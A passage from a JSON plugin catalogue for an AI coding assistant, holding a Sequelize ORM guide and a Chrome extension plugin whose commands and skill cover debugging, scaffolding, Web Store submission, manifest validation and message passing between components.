user.password = await bcrypt.hash(user.password, 10);\n  }\n},\nbeforeUpdate: async (user) => {\n  if (user.changed('password')) {\n    user.password = await bcrypt.hash(user.password, 10);\n  }\n},\n\n// Auto-update timestamps\nbeforeUpdate: (instance) => {\n  instance.updatedAt = new Date();\n},\n\n// Normalize email\nbeforeValidate: (user) => {\n  if (user.email) {\n    user.email = user.email.toLowerCase().trim();\n  }\n},\n\n// Audit logging\nafterCreate: async (instance, options) => {\n  await AuditLog.create({\n    action: 'CREATE',\n    modelName: instance.constructor.name,\n    recordId: instance.id,\n    newValues: instance.toJSON(),\n  }, { transaction: options.transaction });\n},\n```\n\n## Scopes\n\n### Defining Scopes\n```javascript\nUser.init({\n  // ... attributes\n}, {\n  sequelize,\n  modelName: 'User',\n  defaultScope: {\n    attributes: { exclude: ['password'] },\n  },\n  scopes: {\n    active: {\n      where: { status: 'active' },\n    },\n    withPassword: {\n      attributes: { include: ['password'] },\n    },\n    withOrders: {\n      include: [{ model: Order, as: 'orders' }],\n    },\n    recent: {\n      order: [['createdAt', 'DESC']],\n      limit: 10,\n    },\n    byStatus(status) {\n      return {\n        where: { status },\n      };\n    },\n  },\n});\n```\n\n### Using Scopes\n```javascript\n// Apply named scope\nconst activeUsers = await User.scope('active').findAll();\n\n// Chain multiple scopes\nconst recentActive = await User.scope(['active', 'recent']).findAll();\n\n// Scope with parameter\nconst pendingUsers = await User.scope({ method: ['byStatus', 'pending'] }).findAll();\n\n// Override default scope\nconst userWithPassword = await User.scope('withPassword').findByPk(1);\n\n// Remove default scope\nconst allFields = await User.unscoped().findByPk(1);\n```\n\n## Indexes in Sequelize\n\n### Model-Level Indexes\n```javascript\nUser.init({\n  // ... attributes\n}, {\n  sequelize,\n  modelName: 'User',\n  indexes: [\n    // Simple index\n    { fields: ['status'] },\n\n    // Unique index\n    { fields: ['email'], unique: true },\n\n    // Composite index\n    { fields: ['status', 'createdAt'] },\n\n    // Partial index\n    {\n      fields: ['email'],\n      where: { status: 'active' },\n      name: 'active_users_email_idx',\n    },\n\n    // Expression index (requires raw SQL in migration)\n    // Use migrations for LOWER(email) indexes\n\n    // GIN index for JSONB\n    {\n      fields: ['metadata'],\n      using: 'GIN',\n    },\n\n    // Full-text search index\n    {\n      fields: ['searchVector'],\n      using: 'GIN',\n    },\n  ],\n});\n```\n\n## Transactions\n\n### Managed Transactions\n```javascript\n// Sequelize manages commit/rollback\nconst result = await sequelize.transaction(async (t) => {\n  const user = await User.create({ email: 'test@example.com' }, { transaction: t });\n  const order = await Order.create({ userId: user.id, total: 100 }, { transaction: t });\n  return { user, order };\n});\n// Auto-committed if no error, auto-rolled back on error\n```\n\n### Unmanaged Transactions\n```javascript\nconst t = await sequelize.transaction();\ntry {\n  const user = await User.create({ email: 'test@example.com' }, { transaction: t });\n  await Order.create({ userId: user.id, total: 100 }, { transaction: t });\n  await t.commit();\n} catch (error) {\n  await t.rollback();\n  throw error;\n}\n```\n\n### Transaction Isolation Levels\n```javascript\nconst { Transaction } = require('sequelize');\n\nawait sequelize.transaction({\n  isolationLevel: Transaction.ISOLATION_LEVELS.SERIALIZABLE,\n}, async (t) => {\n  // Operations here\n});\n```\n\n## Query Optimization\n\n### Eager Loading vs Lazy Loading\n```javascript\n// Eager loading (preferred - avoids N+1)\nconst users = await User.findAll({\n  include: [{ model: Order, as: 'orders' }],\n});\n\n// Lazy loading (causes N+1 problem)\nconst users = await User.findAll();\nfor (const user of users) {\n  const orders = await user.getOrders(); // N additional queries!\n}\n```\n\n### Select Specific Attributes\n```javascript\n// Only fetch needed columns\nconst users = await User.findAll({\n  attributes: ['id', 'email', 'firstName'],\n});\n\n// Exclude sensitive columns\nconst users = await User.findAll({\n  attributes: { exclude: ['password', 'ssn'] },\n});\n\n// Computed columns\nconst users = await User.findAll({\n  attributes: [\n    'id',\n    [sequelize.fn('COUNT', sequelize.col('orders.id')), 'orderCount'],\n  ],\n  include: [{ model: Order, as: 'orders', attributes: [] }],\n  group: ['User.id'],\n});\n```\n\n### Raw Queries for Complex Operations\n```javascript\n// When ORM abstraction is limiting\nconst [results] = await sequelize.query(`\n  SELECT u.*, COUNT(o.id) as order_count\n  FROM users u\n  LEFT JOIN orders o ON u.id = o.user_id\n  WHERE u.status = :status\n  GROUP BY u.id\n  HAVING COUNT(o.id) > :minOrders\n`, {\n  replacements: { status: 'active', minOrders: 5 },\n  type: QueryTypes.SELECT,\n});\n```\n\n### Batch Operations\n```javascript\n// Bulk create (single INSERT)\nawait User.bulkCreate([\n  { email: 'user1@example.com', firstName: 'User', lastName: 'One' },\n  { email: 'user2@example.com', firstName: 'User', lastName: 'Two' },\n], {\n  validate: true, // Run validations\n  individualHooks: true, // Run hooks per instance (slower)\n});\n\n// Bulk update\nawait User.update(\n  { status: 'inactive' },\n  { where: { lastLoginAt: { [Op.lt]: oneYearAgo } } }\n);\n\n// Bulk destroy\nawait User.destroy({\n  where: { status: 'deleted' },\n});\n```\n\n## Timestamps and Paranoid Mode\n\n### Standard Timestamps\n```javascript\nUser.init({\n  // ... attributes\n}, {\n  sequelize,\n  timestamps: true,      // Adds createdAt, updatedAt\n  createdAt: 'created_at', // Custom column name\n  updatedAt: 'updated_at',\n});\n```\n\n### Soft Deletes (Paranoid Mode)\n```javascript\nUser.init({\n  // ... attributes\n}, {\n  sequelize,\n  paranoid: true,        // Adds deletedAt, filters soft-deleted by default\n  deletedAt: 'deleted_at',\n});\n\n// Soft delete\nawait user.destroy(); // Sets deletedAt, doesn't remove row\n\n// Hard delete\nawait user.destroy({ force: true });\n\n// Include soft-deleted in queries\nawait User.findAll({ paranoid: false });\n\n// Restore soft-deleted\nawait user.restore();\n```\n\n## Best Practices\n\n1. **Always use transactions** for multi-model operations\n2. **Define associations in both directions** for full bidirectional navigation\n3. **Use scopes** to DRY up common query patterns\n4. **Eager load** associations to avoid N+1 queries\n5. **Use `underscored: true`** for PostgreSQL naming conventions\n6. **Prefer TEXT over STRING** to match PostgreSQL best practices\n7. **Add indexes** for frequently queried columns and foreign keys\n8. **Use hooks** for cross-cutting concerns (audit, normalization)\n9. **Keep models focused** - business logic in services, not models\n10. **Use raw queries** for complex analytics rather than forcing ORM patterns"
              }
            ]
          },
          {
            "name": "chrome-extension-expert",
            "description": "Chrome Extension development expert for Manifest V3, APIs, security, side panels, and Web Store submission",
            "source": "./chrome-extension-expert",
            "category": "development",
            "version": null,
            "author": null,
            "install_commands": [
              "/plugin marketplace add francanete/fran-marketplace",
              "/plugin install chrome-extension-expert@fran-marketplace"
            ],
            "signals": {
              "stars": 0,
              "forks": 0,
              "pushed_at": "2025-12-04T14:53:21Z",
              "created_at": "2025-12-04T10:42:38Z",
              "license": null
            },
            "commands": [
              {
                "name": "/debug-extension",
                "description": "Guided debugging for common Chrome Extension issues including service worker, message passing, content script, and storage problems",
                "path": "chrome-extension-expert/commands/debug-extension.md",
                "frontmatter": {
                  "name": "debug-extension",
                  "description": "Guided debugging for common Chrome Extension issues including service worker, message passing, content script, and storage problems",
                  "arguments": [
                    {
                      "name": "issue",
                      "description": "Type of issue to debug (service-worker, messaging, content-script, storage, side-panel, general)",
                      "required": false,
                      "default": "general"
                    }
                  ]
                },
                "content": "# Debug Chrome Extension\n\nGuided debugging for issue type: **{{issue}}**\n\n## Instructions\n\nBased on the issue type, follow the appropriate debugging guide and analyze the extension code.\n\n---\n\n## Service Worker Issues ({{issue}} = service-worker)\n\n### Common Problems\n\n**1. Service Worker Not Registering**\nCheck:\n- [ ] manifest.json has correct `background.service_worker` path\n- [ ] Service worker file exists at specified path\n- [ ] No syntax errors in service worker file\n- [ ] Using `type: \"module\"` if using ES imports\n\n```json\n// Correct manifest configuration\n{\n  \"background\": {\n    \"service_worker\": \"background.js\",\n    \"type\": \"module\"  // Only if using ES modules\n  }\n}\n```\n\n**2. Service Worker Terminating**\n- Service workers terminate after ~30 seconds of inactivity\n- Use `chrome.alarms` for periodic tasks\n- Don't rely on global variables persisting\n\n```javascript\n// BAD - Will lose state\nlet cachedData = null;\n\n// GOOD - Persist to storage\nchrome.storage.session.set({ cachedData: data });\n```\n\n**3. Events Not Firing**\n- Listeners must be registered synchronously at top level\n- Can't add listeners in async callbacks\n\n```javascript\n// BAD - Won't work\nsetTimeout(() => {\n  chrome.runtime.onMessage.addListener(...);\n}, 1000);\n\n// GOOD - Top level registration\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  // Handle asynchronously inside\n});\n```\n\n### Debugging Steps\n1. Go to `chrome://extensions`\n2. Find your extension\n3. Click \"Service Worker\" link\n4. Check console for errors\n5. Set breakpoints in Sources panel\n\n---\n\n## Message Passing Issues ({{issue}} = messaging)\n\n### Common Problems\n\n**1. \"Receiving end does not exist\"**\nCauses:\n- Content script not injected\n- Tab navigated away\n- Extension context invalidated\n\n```javascript\n// Safe message sending\nasync function sendToTab(tabId, message) {\n  try {\n    return await chrome.tabs.sendMessage(tabId, message);\n  } catch (error) {\n    if (error.message.includes('Receiving end does not exist')) {\n      // Inject content script first\n      await chrome.scripting.executeScript({\n        target: { tabId },\n        files: ['content.js']\n      });\n      return await chrome.tabs.sendMessage(tabId, message);\n    }\n    throw error;\n  }\n}\n```\n\n**2. Async Response Not Working**\nMust return `true` from listener for async responses:\n\n```javascript\n// WRONG - Response never sent\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  fetch(url).then(data => sendResponse(data));\n  // Missing return true!\n});\n\n// CORRECT\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  fetch(url).then(data => sendResponse(data));\n  return true; // CRITICAL for async\n});\n```\n\n**3. Port Disconnected**\nLong-lived connections close after 5 minutes of inactivity or when the other end closes.\n\n### Debugging Steps\n1. Add logging to both sender and receiver\n2. Check sender ID matches extension ID\n3. Verify content script is injected (check page console)\n4. Check for `chrome.runtime.lastError`\n\n---\n\n## Content Script Issues ({{issue}} = content-script)\n\n### Common Problems\n\n**1. Script Not Injecting**\nCheck:\n- [ ] `matches` pattern in manifest is correct\n- [ ] URL matches the pattern\n- [ ] Page isn't chrome://, chrome-extension://, or other restricted URL\n\n```json\n{\n  \"content_scripts\": [{\n    \"matches\": [\"*://*.example.com/*\"],\n    \"js\": [\"content.js\"],\n    \"run_at\": \"document_idle\"\n  }]\n}\n```\n\n**2. Script Runs But Nothing Happens**\n- Check correct console context (select extension from dropdown)\n- Verify DOM is ready\n- Check for CSS conflicts\n\n```javascript\n// Ensure DOM is ready\nif (document.readyState === 'loading') {\n  document.addEventListener('DOMContentLoaded', init);\n} else {\n  init();\n}\n```\n\n**3. Cross-Origin Restrictions**\nContent scripts can't make cross-origin requests. Use background script as relay.\n\n### Debugging Steps\n1. Open page DevTools (F12)\n2. Go to Console tab\n3. Select extension context from dropdown\n4. Check for errors\n5. Verify script loaded with console.log at top\n\n---\n\n## Storage Issues ({{issue}} = storage)\n\n### Common Problems\n\n**1. Data Not Persisting**\n```javascript\n// Check what's actually stored\nconst all = await chrome.storage.local.get(null);\nconsole.log('All storage:', all);\n```\n\n**2. Sync Storage Quota Exceeded**\n- Sync: 102,400 bytes total, 8,192 bytes per item\n- Local: 10,485,760 bytes\n\n```javascript\n// Check usage\nconst usage = await chrome.storage.sync.getBytesInUse(null);\nconsole.log('Sync usage:', usage, '/ 102400');\n```\n\n**3. Storage Not Syncing**\n- User must be signed into Chrome\n- Sync must be enabled\n- Check `chrome.storage.sync` specifically\n\n### Debugging Steps\n1. Open extension DevTools\n2. Go to Application > Storage\n3. Check chrome.storage.local and chrome.storage.sync\n4. Monitor with `chrome.storage.onChanged`\n\n---\n\n## Side Panel Issues ({{issue}} = side-panel)\n\n### Common Problems\n\n**1. Side Panel Not Appearing**\nCheck:\n- [ ] `sidePanel` permission in manifest\n- [ ] `side_panel.default_path` set correctly\n- [ ] HTML file exists\n\n```json\n{\n  \"permissions\": [\"sidePanel\"],\n  \"side_panel\": {\n    \"default_path\": \"sidepanel.html\"\n  }\n}\n```\n\n**2. Can't Open Programmatically**\n```javascript\n// Must be in response to user action\nchrome.action.onClicked.addListener((tab) => {\n  chrome.sidePanel.open({ tabId: tab.id });\n});\n```\n\n**3. State Lost When Panel Closes**\nSide panel is recreated each time. Use storage:\n```javascript\n// Save state before unload\nwindow.addEventListener('beforeunload', () => {\n  chrome.storage.session.set({ panelState: currentState });\n});\n\n// Restore on load\nconst { panelState } = await chrome.storage.session.get('panelState');\n```\n\n---\n\n## General Debugging ({{issue}} = general)\n\n### Quick Diagnosis\n1. Check `chrome://extensions` for errors (red badge)\n2. Click \"Errors\" to see details\n3. Reload extension after changes\n4. Check all relevant consoles:\n   - Service worker console\n   - Popup/side panel DevTools\n   - Page console (content scripts)\n\n### Common Fixes\n- Clear extension storage and reload\n- Uninstall and reinstall extension\n- Check for typos in file paths\n- Verify all referenced files exist\n- Check permissions are correct\n\n---\n\nNow analyze the extension code for {{issue}} issues and provide specific debugging recommendations."
              },
              {
                "name": "/scaffold-extension",
                "description": "Create a new Chrome Extension project structure with Manifest V3, complete file setup, and optional TypeScript/build configuration",
                "path": "chrome-extension-expert/commands/scaffold-extension.md",
                "frontmatter": {
                  "name": "scaffold-extension",
                  "description": "Create a new Chrome Extension project structure with Manifest V3, complete file setup, and optional TypeScript/build configuration",
                  "arguments": [
                    {
                      "name": "name",
                      "description": "Name of the extension project",
                      "required": true
                    },
                    {
                      "name": "type",
                      "description": "Extension type (popup, sidepanel, content, or full)",
                      "required": false,
                      "default": "popup"
                    }
                  ]
                },
                "content": "# Scaffold Chrome Extension\n\nCreate a new Chrome Extension project with Manifest V3 best practices.\n\n## Parameters\n- **name**: {{name}} (required)\n- **type**: {{type}} (popup | sidepanel | content | full)\n\n## Instructions\n\nBased on the provided parameters, create a complete extension project structure.\n\n### For ALL extension types, create:\n\n1. **manifest.json** - Manifest V3 configuration\n2. **icons/** - Placeholder icons (16, 32, 48, 128)\n3. **README.md** - Basic documentation\n\n### Type-specific files:\n\n**popup** (default):\n- popup.html\n- popup.css\n- popup.js\n- background.js (service worker)\n\n**sidepanel**:\n- sidepanel.html\n- sidepanel.css\n- sidepanel.js\n- background.js (service worker)\n\n**content**:\n- content.js\n- content.css\n- background.js (service worker)\n\n**full** (all components):\n- popup.html, popup.css, popup.js\n- sidepanel.html, sidepanel.css, sidepanel.js\n- content.js, content.css\n- options.html, options.css, options.js\n- background.js (service worker)\n\n## Manifest Template\n\n```json\n{\n  \"manifest_version\": 3,\n  \"name\": \"{{name}}\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Description of {{name}}\",\n  \"permissions\": [\"storage\"],\n  \"icons\": {\n    \"16\": \"icons/icon16.png\",\n    \"32\": \"icons/icon32.png\",\n    \"48\": \"icons/icon48.png\",\n    \"128\": \"icons/icon128.png\"\n  }\n}\n```\n\nAdd appropriate sections based on type:\n\n**For popup:**\n```json\n{\n  \"action\": {\n    \"default_popup\": \"popup.html\",\n    \"default_icon\": {\n      \"16\": \"icons/icon16.png\",\n      \"32\": \"icons/icon32.png\"\n    }\n  },\n  \"background\": {\n    \"service_worker\": \"background.js\"\n  }\n}\n```\n\n**For sidepanel:**\n```json\n{\n  \"side_panel\": {\n    \"default_path\": \"sidepanel.html\"\n  },\n  \"permissions\": [\"storage\", \"sidePanel\"],\n  \"background\": {\n    \"service_worker\": \"background.js\"\n  },\n  \"action\": {\n    \"default_title\": \"Open Side Panel\"\n  }\n}\n```\n\n**For content:**\n```json\n{\n  \"content_scripts\": [{\n    \"matches\": [\"<all_urls>\"],\n    \"js\": [\"content.js\"],\n    \"css\": [\"content.css\"]\n  }],\n  \"background\": {\n    \"service_worker\": \"background.js\"\n  }\n}\n```\n\n## After Scaffolding\n\n1. Replace placeholder icons with actual icons\n2. Update manifest description\n3. Adjust permissions based on needs\n4. Update content_scripts matches for specific domains\n5. Test by loading unpacked extension\n\n## Directory Structure Output\n\n```\n{{name}}/\n├── manifest.json\n├── background.js\n├── icons/\n│   ├── icon16.png (placeholder)\n│   ├── icon32.png (placeholder)\n│   ├── icon48.png (placeholder)\n│   └── icon128.png (placeholder)\n├── [type-specific files]\n└── README.md\n```\n\nNow create the extension structure for \"{{name}}\" with type \"{{type}}\"."
              },
              {
                "name": "/store-checklist",
                "description": "Generate a comprehensive Chrome Web Store submission checklist for your extension, including policy compliance and required assets",
                "path": "chrome-extension-expert/commands/store-checklist.md",
                "frontmatter": {
                  "name": "store-checklist",
                  "description": "Generate a comprehensive Chrome Web Store submission checklist for your extension, including policy compliance and required assets"
                },
                "content": "# Chrome Web Store Submission Checklist\n\nGenerate a comprehensive checklist for submitting your extension to the Chrome Web Store.\n\n## Instructions\n\n1. Analyze the current extension project\n2. Check for required assets and compliance items\n3. Generate a personalized checklist based on the extension's features\n\n## Pre-Submission Checklist\n\n### 1. Technical Requirements\n\n#### Manifest\n- [ ] manifest_version is 3\n- [ ] name is descriptive (max 45 chars)\n- [ ] version follows semver (e.g., 1.0.0)\n- [ ] description is clear (max 132 chars for store display)\n- [ ] All referenced files exist\n\n#### Icons (Required)\n- [ ] 16x16 PNG icon\n- [ ] 32x32 PNG icon (for Windows)\n- [ ] 48x48 PNG icon (extensions page)\n- [ ] 128x128 PNG icon (store listing)\n- [ ] Icons are clear at small sizes\n- [ ] No trademark/copyright violations\n\n#### Functionality\n- [ ] Extension works on Chrome stable\n- [ ] All advertised features functional\n- [ ] Error handling implemented\n- [ ] No console errors in normal use\n- [ ] Tested on multiple websites (if applicable)\n\n### 2. Store Listing Assets\n\n#### Screenshots (Required)\n- [ ] At least 1 screenshot\n- [ ] Size: 1280x800 or 640x400 pixels\n- [ ] PNG or JPEG format\n- [ ] Shows actual functionality\n- [ ] No excessive promotional text\n- [ ] High quality, no artifacts\n\n#### Promotional Images\n- [ ] Small tile: 440x280 (required for featuring)\n- [ ] Marquee: 1400x560 (optional)\n\n#### Store Listing Content\n- [ ] Detailed description written\n- [ ] Key features highlighted\n- [ ] Usage instructions included\n- [ ] Category selected appropriately\n- [ ] Language/localization set\n\n### 3. Privacy & Compliance\n\n#### Privacy Policy (Required if collecting data)\n- [ ] Privacy policy URL accessible\n- [ ] Covers what data is collected\n- [ ] Explains how data is used\n- [ ] Describes data storage\n- [ ] Third-party sharing disclosed\n- [ ] User deletion rights explained\n- [ ] Contact information provided\n\n#### Permission Justifications\nFor each sensitive permission, prepare justification:\n\n| Permission | Justification Required |\n|------------|----------------------|\n| tabs | Yes - explain tab access |\n| history | Yes - explain history access |\n| bookmarks | Yes - explain bookmark access |\n| <all_urls> | Yes - explain broad access |\n| cookies | Yes - explain cookie access |\n| webNavigation | Yes - explain navigation tracking |\n\n#### Single Purpose Policy\n- [ ] Extension has ONE clear purpose\n- [ ] All features relate to core purpose\n- [ ] No bundled unrelated functionality\n\n#### Data Handling\n- [ ] Minimal data collection\n- [ ] No unnecessary permissions\n- [ ] Secure data transmission (HTTPS)\n- [ ] No selling of user data\n\n### 4. Policy Compliance\n\n#### Content Policies\n- [ ] No malware or deceptive behavior\n- [ ] No spam or repetitive content\n- [ ] No sexually explicit material\n- [ ] No hate speech or violence\n- [ ] No illegal activities\n\n#### Developer Policies\n- [ ] No impersonation\n- [ ] No misleading functionality\n- [ ] No unauthorized data collection\n- [ ] No interfering with other extensions\n- [ ] No cryptocurrency mining\n\n### 5. Quality Checks\n\n#### User Experience\n- [ ] Clear onboarding for new users\n- [ ] Intuitive interface\n- [ ] Responsive to user actions\n- [ ] Appropriate loading states\n- [ ] Clear error messages\n\n#### Performance\n- [ ] Fast popup/panel load time\n- [ ] Minimal memory usage\n- [ ] No impact on browser performance\n- [ ] Efficient background processing\n\n### 6. Developer Account\n\n- [ ] Developer account created\n- [ ] $5 registration fee paid\n- [ ] Contact email verified\n- [ ] Developer name set\n\n### 7. Final Review\n\n- [ ] Test extension after packaging\n- [ ] ZIP file created (not .crx)\n- [ ] All files included in package\n- [ ] No development/debug code\n- [ ] Version number updated\n\n## Submission Steps\n\n1. Go to [Chrome Developer Dashboard](https://chrome.google.com/webstore/devconsole)\n2. Click \"New Item\"\n3. Upload ZIP file\n4. Fill in store listing\n5. Upload screenshots\n6. Complete privacy practices\n7. Add privacy policy URL\n8. Submit for review\n\n## Expected Timeline\n\n- Initial review: 1-3 business days\n- Complex extensions: Up to 7 days\n- Rejections require re-submission\n\n## After Approval\n\n- [ ] Test published extension\n- [ ] Monitor user reviews\n- [ ] Set up crash/error reporting\n- [ ] Plan update schedule\n\n---\n\nNow analyze the current project and generate a customized checklist highlighting what's done and what's missing."
              },
              {
                "name": "/validate-manifest",
                "description": "Validate a Chrome Extension manifest.json for Manifest V3 compliance, required fields, and store submission readiness",
                "path": "chrome-extension-expert/commands/validate-manifest.md",
                "frontmatter": {
                  "name": "validate-manifest",
                  "description": "Validate a Chrome Extension manifest.json for Manifest V3 compliance, required fields, and store submission readiness"
                },
                "content": "# Validate Chrome Extension Manifest\n\nAnalyze the manifest.json in the current project for:\n1. Manifest V3 compliance\n2. Required fields\n3. Permission issues\n4. Store submission readiness\n5. Common mistakes\n\n## Instructions\n\n1. First, find and read the manifest.json file in the project\n2. Perform the validation checks below\n3. Report findings in a structured format\n\n## Validation Checks\n\n### Required Fields (MV3)\n- [ ] `manifest_version` = 3\n- [ ] `name` (max 45 characters)\n- [ ] `version` (valid semver format)\n- [ ] `description` (max 132 characters for store)\n\n### Icons\n- [ ] 16x16 icon present\n- [ ] 48x48 icon present\n- [ ] 128x128 icon present\n- [ ] Icon files exist at specified paths\n\n### Background (if present)\n- [ ] Uses `service_worker` (not `scripts` or `page`)\n- [ ] Service worker file exists\n- [ ] `type: \"module\"` if using ES modules\n\n### Content Scripts (if present)\n- [ ] `matches` array defined\n- [ ] Referenced JS/CSS files exist\n- [ ] `run_at` is valid (document_idle, document_start, document_end)\n\n### Action (if present)\n- [ ] `default_popup` file exists (if specified)\n- [ ] `default_icon` files exist\n\n### Side Panel (if present)\n- [ ] `sidePanel` permission included\n- [ ] `default_path` file exists\n\n### Permissions Analysis\n- [ ] No deprecated permissions\n- [ ] Permissions match functionality\n- [ ] `host_permissions` properly separated from `permissions`\n- [ ] No overly broad permissions without justification\n\n### MV3 Compliance\n- [ ] No `background.page` or `background.scripts`\n- [ ] No `browser_action` (use `action` instead)\n- [ ] No `page_action` (use `action` instead)\n- [ ] CSP compliant (no unsafe-eval, no remote code)\n\n### Store Readiness\n- [ ] Name is unique and descriptive\n- [ ] Description is clear and complete\n- [ ] All required icons present\n- [ ] No policy-violating permissions\n\n## Output Format\n\n```markdown\n## Manifest Validation Report\n\n### Status: [PASS/FAIL/WARNINGS]\n\n### Required Fields\n| Field | Status | Value/Issue |\n|-------|--------|-------------|\n| manifest_version | ✅/❌ | |\n| name | ✅/❌ | |\n| version | ✅/❌ | |\n| description | ✅/❌ | |\n\n### Icons\n[Status of icon validation]\n\n### Background Service Worker\n[Status and issues]\n\n### Permissions\n| Permission | Necessary | Justification Needed |\n|------------|-----------|---------------------|\n| [perm] | Yes/No/Maybe | Yes/No |\n\n### MV3 Compliance Issues\n[List any MV2 patterns found]\n\n### Recommendations\n1. [High priority fixes]\n2. [Improvements]\n3. [Suggestions]\n\n### Store Submission Readiness\n[Ready/Not Ready] - [Explanation]\n```\n\nNow find and validate the manifest.json file."
              }
            ],
            "skills": [
              {
                "name": "component-communication",
                "description": "Inter-component messaging patterns for Chrome Extensions covering background ↔ content script ↔ popup ↔ side panel communication, ports, message passing, state synchronization, and error handling. Essential for multi-component extensions.",
                "path": "chrome-extension-expert/skills/component-communication/SKILL.md",
                "frontmatter": {
                  "name": "component-communication",
                  "description": "Inter-component messaging patterns for Chrome Extensions covering background ↔ content script ↔ popup ↔ side panel communication, ports, message passing, state synchronization, and error handling. Essential for multi-component extensions."
                },
                "content": "# Chrome Extension Component Communication\n\n## Overview\n\nChrome extensions have isolated components that must communicate via message passing:\n\n```\n┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐\n│   Side Panel    │     │     Popup       │     │  Options Page   │\n└────────┬────────┘     └────────┬────────┘     └────────┬────────┘\n         │                       │                       │\n         └───────────────────────┼───────────────────────┘\n                                 │\n                    ┌────────────┴────────────┐\n                    │   Background Service    │\n                    │       Worker            │\n                    └────────────┬────────────┘\n                                 │\n         ┌───────────────────────┼───────────────────────┐\n         │                       │                       │\n┌────────┴────────┐     ┌────────┴────────┐     ┌────────┴────────┐\n│ Content Script  │     │ Content Script  │     │ Content Script  │\n│    (Tab 1)      │     │    (Tab 2)      │     │    (Tab 3)      │\n└─────────────────┘     └─────────────────┘     └─────────────────┘\n```\n\n---\n\n## One-Time Messages\n\n### Background ↔ Content Script\n\n**Content Script → Background:**\n```javascript\n// content.js\nconst response = await chrome.runtime.sendMessage({\n  type: 'SAVE_DATA',\n  data: { url: window.location.href }\n});\nconsole.log('Response:', response);\n```\n\n**Background → Content Script:**\n```javascript\n// background.js\nconst response = await chrome.tabs.sendMessage(tabId, {\n  type: 'GET_PAGE_DATA'\n});\n```\n\n**Background Listener:**\n```javascript\n// background.js\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  // sender.tab exists if from content script\n  if (sender.tab) {\n    console.log('From tab:', sender.tab.id, sender.tab.url);\n  }\n\n  switch (message.type) {\n    case 'SAVE_DATA':\n      saveData(message.data)\n        .then(result => sendResponse({ success: true, result }))\n        .catch(error => sendResponse({ success: false, error: error.message }));\n      return true; // CRITICAL: Keep channel open for async response\n\n    case 'GET_STATUS':\n      sendResponse({ status: 'ready' }); // Sync response\n      break;\n  }\n});\n```\n\n### Background ↔ Popup / Side Panel\n\n**Popup/Side Panel → Background:**\n```javascript\n// popup.js or sidepanel.js\nconst response = await chrome.runtime.sendMessage({\n  type: 'FETCH_DATA',\n  query: 'search term'\n});\nupdateUI(response.data);\n```\n\n**Background → Popup/Side Panel:**\n```javascript\n// background.js - Broadcast to all extension pages\nchrome.runtime.sendMessage({\n  type: 'DATA_UPDATED',\n  data: newData\n}).catch(() => {\n  // No listeners - popup/panel might be closed\n});\n```\n\n---\n\n## Long-Lived Connections (Ports)\n\nUse for streaming data or maintaining connection state.\n\n### Creating Ports\n\n**Content Script → Background:**\n```javascript\n// content.js\nconst port = chrome.runtime.connect({ name: 'content-channel' });\n\nport.onMessage.addListener((message) => {\n  console.log('Received:', message);\n});\n\nport.postMessage({ type: 'INIT', url: location.href });\n\n// Handle disconnect\nport.onDisconnect.addListener(() => {\n  console.log('Port disconnected');\n  if (chrome.runtime.lastError) {\n    console.error(chrome.runtime.lastError.message);\n  }\n});\n```\n\n**Background Port Listener:**\n```javascript\n// background.js\nconst connectedPorts = new Map();\n\nchrome.runtime.onConnect.addListener((port) => {\n  console.log('New connection:', port.name);\n\n  if (port.name === 'content-channel') {\n    const tabId = port.sender.tab.id;\n    connectedPorts.set(tabId, port);\n\n    port.onMessage.addListener((message) => {\n      handleContentMessage(message, port, tabId);\n    });\n\n    port.onDisconnect.addListener(() => {\n      connectedPorts.delete(tabId);\n    });\n  }\n});\n\n// Send to specific tab's content script\nfunction sendToTab(tabId, message) {\n  const port = connectedPorts.get(tabId);\n  if (port) {\n    port.postMessage(message);\n  }\n}\n```\n\n### Background ↔ Side Panel Port\n\n```javascript\n// sidepanel.js\nlet backgroundPort;\n\nfunction connectToBackground() {\n  backgroundPort = chrome.runtime.connect({ name: 'sidepanel' });\n\n  backgroundPort.onMessage.addListener((message) => {\n    switch (message.type) {\n      case 'UPDATE':\n        updateUI(message.data);\n        break;\n      case 'STATUS':\n        showStatus(message.status);\n        break;\n    }\n  });\n\n  backgroundPort.onDisconnect.addListener(() => {\n    // Reconnect after delay\n    setTimeout(connectToBackground, 1000);\n  });\n}\n\ndocument.addEventListener('DOMContentLoaded', connectToBackground);\n```\n\n---\n\n## Content Script ↔ Side Panel Communication\n\nContent scripts and side panel cannot communicate directly. Use background as relay.\n\n### Pattern: Background Relay\n\n```javascript\n// content.js\nchrome.runtime.sendMessage({\n  type: 'TO_SIDEPANEL',\n  payload: { selectedText: selection }\n});\n\n// background.js\nconst sidePanelPorts = new Map();\n\nchrome.runtime.onConnect.addListener((port) => {\n  if (port.name === 'sidepanel') {\n    const windowId = port.sender.tab?.windowId;\n    sidePanelPorts.set(windowId, port);\n\n    port.onDisconnect.addListener(() => {\n      sidePanelPorts.delete(windowId);\n    });\n  }\n});\n\nchrome.runtime.onMessage.addListener((message, sender) => {\n  if (message.type === 'TO_SIDEPANEL') {\n    const windowId = sender.tab.windowId;\n    const sidePanelPort = sidePanelPorts.get(windowId);\n    if (sidePanelPort) {\n      sidePanelPort.postMessage({\n        type: 'FROM_CONTENT',\n        tabId: sender.tab.id,\n        payload: message.payload\n      });\n    }\n  }\n});\n\n// sidepanel.js\nconst port = chrome.runtime.connect({ name: 'sidepanel' });\nport.onMessage.addListener((message) => {\n  if (message.type === 'FROM_CONTENT') {\n    handleContentData(message.payload, message.tabId);\n  }\n});\n```\n\n---\n\n## Broadcasting to All Tabs\n\n```javascript\n// background.js\nasync function broadcastToAllTabs(message) {\n  const tabs = await chrome.tabs.query({});\n\n  for (const tab of tabs) {\n    try {\n      await chrome.tabs.sendMessage(tab.id, message);\n    } catch (error) {\n      // Tab doesn't have content script\n    }\n  }\n}\n\n// Broadcast to tabs matching pattern\nasync function broadcastToMatchingTabs(pattern, message) {\n  const tabs = await chrome.tabs.query({ url: pattern });\n\n  const results = await Promise.allSettled(\n    tabs.map(tab => chrome.tabs.sendMessage(tab.id, message))\n  );\n\n  return results\n    .filter(r => r.status === 'fulfilled')\n    .map(r => r.value);\n}\n```\n\n---\n\n## State Synchronization\n\n### Using Storage for State Sync\n\n```javascript\n// Any component - update state\nasync function updateSharedState(updates) {\n  const { state } = await chrome.storage.local.get('state');\n  const newState = 